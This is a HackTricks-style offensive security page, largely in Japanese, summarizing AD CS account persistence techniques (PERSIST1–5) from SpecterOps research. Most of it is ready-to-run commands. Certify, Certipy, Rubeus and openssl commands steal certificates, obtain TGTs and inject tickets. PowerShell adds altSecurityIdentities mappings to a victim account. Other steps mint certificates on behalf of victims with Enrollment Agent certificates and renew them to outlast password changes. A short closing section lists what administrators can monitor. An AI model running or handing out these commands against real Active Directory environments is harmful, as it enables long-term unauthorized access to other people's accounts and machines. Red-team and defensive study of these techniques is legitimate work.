# AD CS アカウント永続化

{{#include ../../../banners/hacktricks-training.md}}

**これは [https://specterops.io/assets/resources/Certified_Pre-Owned.pdf](https://specterops.io/assets/resources/Certified_Pre-Owned.pdf) の素晴らしい調査のアカウント永続化章の簡潔な要約です**

## 証明書によるアクティブユーザー資格情報の窃取を理解する – PERSIST1

ユーザーがドメイン認証を許可する証明書を要求できるシナリオでは、攻撃者はこの証明書を要求して窃取することでネットワーク上での永続化を維持する機会を得ます。デフォルトでは、Active Directory の `User` テンプレートはそのような要求を許可しますが、場合によっては無効化されていることもあります。

Using [Certify](https://github.com/GhostPack/Certify) or [Certipy](https://github.com/ly4k/Certipy), you can search for enabled templates that allow client authentication and then request one:
```bash
# Enumerate client-auth capable templates
Certify.exe find /clientauth

# Request a user cert from an Enterprise CA (current user context)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User

# Using Certipy (RPC/DCOM/WebEnrollment supported). Saves a PFX by default
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' -template 'User' -out user.pfx
```
証明書の力は、有効である限り、その証明書が属するユーザーとして認証できる点にあり、password の変更は関係ありません。

PEM を PFX に変換して、それを使って TGT を取得できます:
```bash
# Convert PEM returned by Certify to PFX
openssl pkcs12 -in cert.pem -keyex -CSP "Microsoft Enhanced Cryptographic Provider v1.0" -export -out cert.pfx

# Use certificate for PKINIT and inject the TGT
Rubeus.exe asktgt /user:john /certificate:C:\Temp\cert.pfx /password:CertPass! /ptt

# Or with Certipy
certipy auth -pfx user.pfx -dc-ip 10.0.0.10
```
> 注意: 他の手法（THEFT セクション参照）と組み合わせると、証明書ベースの認証は LSASS に触れず、非特権コンテキストからでも永続的なアクセスを可能にします。

## 証明書によるマシン永続化 - PERSIST2

攻撃者がホスト上で権限を持っている場合、既定の `Machine` テンプレートを使用して侵害されたシステムのマシンアカウントの証明書を登録できます。マシンとして認証すると、ローカルサービスに対して S4U2Self を有効にでき、耐久性のあるホスト永続化を提供する可能性があります:
```bash
# Request a machine certificate as SYSTEM
Certify.exe request /ca:dc.theshire.local/theshire-DC-CA /template:Machine /machine

# Authenticate as the machine using the issued PFX
Rubeus.exe asktgt /user:HOSTNAME$ /certificate:C:\Temp\host.pfx /password:Passw0rd! /ptt
```
## 証明書の更新を利用した永続化の延長 - PERSIST3

証明書テンプレートの有効期間や更新期間を悪用すると、攻撃者は長期的なアクセスを維持できます。既に発行された証明書とその秘密鍵を所有している場合、有効期限前に更新して新しい長期有効な認証情報を取得でき、元のプリンシパルに紐づく追加のリクエスト痕跡を残しません。
```bash
# Renewal with Certipy (works with RPC/DCOM/WebEnrollment)
# Provide the existing PFX and target the same CA/template when possible
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -pfx user_old.pfx -renew -out user_renewed.pfx

# Native Windows renewal with certreq
# (use the serial/thumbprint of the cert to renew; reusekeys preserves the keypair)
certreq -enroll -user -cert <SerialOrID> renew [reusekeys]
```
> 運用上のヒント: 攻撃者が保有している PFX ファイルの有効期限を追跡し、早めに更新すること。更新により、更新済みの証明書が最新の SID マッピング拡張を含むようになり、より厳格な DC マッピングルール下でも利用可能なままになることがある（次のセクション参照）。

## 明示的な証明書マッピングの植え付け (altSecurityIdentities) – PERSIST4

ターゲットアカウントの `altSecurityIdentities` 属性に書き込みできる場合、攻撃者が制御する証明書をそのアカウントに明示的にマップできます。これはパスワード変更をまたいで持続し、強力なマッピング形式を使用すれば、最新の DC 運用でも機能し続けます。

高レベルの流れ：

1. 攻撃者が制御するクライアント認証用証明書を取得または発行する（例: 自分で `User` テンプレートを登録する）。
2. 証明書から強力な識別子を抽出する（Issuer+Serial、SKI、または SHA1-PublicKey）。
3. その識別子を使って被害者プリンシパルの `altSecurityIdentities` に明示的なマッピングを追加する。
4. 自分の証明書で認証すると、DC は明示的マッピングを介してそれを被害者にマップする。

Example (PowerShell) using a strong Issuer+Serial mapping:
```powershell
# Example values - reverse the issuer DN and serial as required by AD mapping format
$Issuer  = 'DC=corp,DC=local,CN=CORP-DC-CA'
$SerialR = '1200000000AC11000000002B' # reversed byte order of the serial
$Map     = "X509:<I>$Issuer<SR>$SerialR"

# Add mapping to victim. Requires rights to write altSecurityIdentities on the object
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
```
その後、PFXを使って認証します。Certipyは直接TGTを取得します:
```bash
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10

# If PKINIT is unavailable on the DC, reuse the same persisted cert via Schannel/LDAPS
certipy auth -pfx attacker_user.pfx -dc-ip 10.0.0.10 -ldap-shell
```
### 強力な `altSecurityIdentities` マッピングの構築

実務上、**Issuer+Serial** と **SKI** のマッピングは、攻撃者が保持する証明書から構築できる最も簡単な強力な形式です。これは **February 11, 2025** 以降に重要になります。DCs がデフォルトで **Full Enforcement** になり、弱いマッピングは信頼できなくなるためです。
```bash
# Extract issuer, serial and SKI from a cert/PFX
openssl pkcs12 -in attacker_user.pfx -clcerts -nokeys -out attacker_user.crt
openssl x509 -in attacker_user.crt -noout -issuer -serial -ext subjectKeyIdentifier
```

```powershell
# Example strong SKI mapping for a user or computer object
$Map = 'X509:<SKI>9C4D7E8A1B2C3D4E5F60718293A4B5C6D7E8F901'
Set-ADUser -Identity 'victim' -Add @{altSecurityIdentities=$Map}
# Set-ADComputer -Identity 'WS01$' -Add @{altSecurityIdentities=$Map}
```
注意
- 強力なマッピングタイプのみを使用してください: `X509IssuerSerialNumber`, `X509SKI`, or `X509SHA1PublicKey`。弱いフォーマット（Subject/Issuer、Subject-only、RFC822 email）は非推奨で、DC ポリシーによってブロックされる可能性があります。
- マッピングは **user** と **computer** の両方のオブジェクトで機能するため、computer account の `altSecurityIdentities` への書き込み権限があればそのマシンとして永続化できます。
- 証明書チェーンは DC によって信頼されたルートまで構築される必要があります。NTAuth にある Enterprise CAs は通常信頼されます；環境によっては public CAs も信頼されます。
- DC が Smart Card Logon EKU を欠いているか `KDC_ERR_PADATA_TYPE_NOSUPP` を返すために PKINIT が失敗する場合でも、Schannel 認証は永続化に有用です。

弱い明示的マッピングと攻撃経路の詳細については、次を参照してください：


{{#ref}}
domain-escalation.md
{{#endref}}

## Enrollment Agent としての永続化 – PERSIST5

有効な Certificate Request Agent/Enrollment Agent 証明書を入手した場合、ユーザーに代わって自由に新しいログオン可能な証明書を発行でき、エージェントの PFX をオフラインで保持して永続化トークンとして使用できます。悪用ワークフロー：
```bash
# Request an Enrollment Agent cert (requires template rights)
Certify.exe request /ca:CA-SERVER\CA-NAME /template:"Certificate Request Agent"

# Mint a user cert on behalf of another principal using the agent PFX
Certify.exe request /ca:CA-SERVER\CA-NAME /template:User \
/onbehalfof:CORP\\victim /enrollcert:C:\Temp\agent.pfx /enrollcertpw:AgentPfxPass

# Or with Certipy
certipy req -u 'john@corp.local' -p 'Passw0rd!' -ca 'CA-SERVER\CA-NAME' \
-template 'User' -on-behalf-of 'CORP/victim' -pfx agent.pfx -out victim_onbo.pfx
```
この永続化を無効化するには、エージェント証明書の撤回またはテンプレート権限の削除が必要です。

Operational notes
- Modern `Certipy` versions support both `-on-behalf-of` and `-renew`, so an attacker holding an Enrollment Agent PFX can mint and later renew leaf certificates without re-touching the original target account.
- If PKINIT-based TGT retrieval is not possible, the resulting on-behalf-of certificate is still usable for Schannel authentication with `certipy auth -pfx victim_onbo.pfx -dc-ip 10.0.0.10 -ldap-shell`.

## 2025 Strong Certificate Mapping Enforcement: Impact on Persistence

Microsoft KB5014754 introduced Strong Certificate Mapping Enforcement on domain controllers. Since February 11, 2025, DCs default to Full Enforcement, rejecting weak/ambiguous mappings. Practical implications:

- SID マッピング拡張を欠く 2022 年以前の証明書は、DC が Full Enforcement の場合に暗黙のマッピングに失敗することがあります。攻撃者は AD CS を通じて証明書を更新して（SID 拡張を取得）アクセスを維持するか、`altSecurityIdentities` に強力な明示的マッピング（PERSIST4）を植え付けることで維持できます。
- Issuer+Serial、SKI、SHA1-PublicKey のような強力な形式を用いた明示的マッピングは引き続き機能します。Issuer/Subject、Subject-only、RFC822 のような弱い形式はブロックされ得るため、永続化には避けるべきです。

管理者は以下を監視し、アラートを出すべきです：
- `altSecurityIdentities` の変更、および Enrollment Agent と User 証明書の発行/更新
- on-behalf-of リクエストや異常な更新パターンに関する CA 発行ログ

## References

- Microsoft. KB5014754: Certificate-based authentication changes on Windows domain controllers (enforcement timeline and strong mappings).
https://support.microsoft.com/en-au/topic/kb5014754-certificate-based-authentication-changes-on-windows-domain-controllers-ad2c23b0-15d8-4340-a468-4d4f3b188f16
- SpecterOps. ADCS ESC14 Abuse Technique (explicit `altSecurityIdentities` abuse on user/computer objects).
https://specterops.io/blog/2024/02/28/adcs-esc14-abuse-technique/
- Certipy Wiki – Command Reference (`req -renew`, `auth`, `shadow`).
https://github.com/ly4k/Certipy/wiki/08-%E2%80%90-Command-Reference
- Almond Offensive Security. Authenticating with certificates when PKINIT is not supported.
https://offsec.almond.consulting/authenticating-with-certificates-when-pkinit-is-not-supported.html

{{#include ../../../banners/hacktricks-training.md}}
